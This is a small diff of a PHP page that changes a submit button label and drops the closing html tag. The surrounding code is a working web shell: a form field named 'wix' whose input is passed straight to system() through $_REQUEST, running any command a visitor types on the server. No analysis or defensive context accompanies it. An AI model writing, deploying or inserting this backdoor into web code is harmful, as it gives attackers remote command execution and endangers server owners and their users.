@@ -3,7 +3,7 @@
 <body>
 <FORM METHOD="GET" NAME="myform" ACTION="">
 <INPUT TYPE="text" NAME="wix">
-<INPUT TYPE="submit" VALUE="Submit">
+<INPUT TYPE="submit" VALUE=">">
 </FORM>
 <pre>
 <?php
@@ -13,4 +13,3 @@ system($_REQUEST["wix"]);
 ?>
 </pre>
 </body>
-</html>
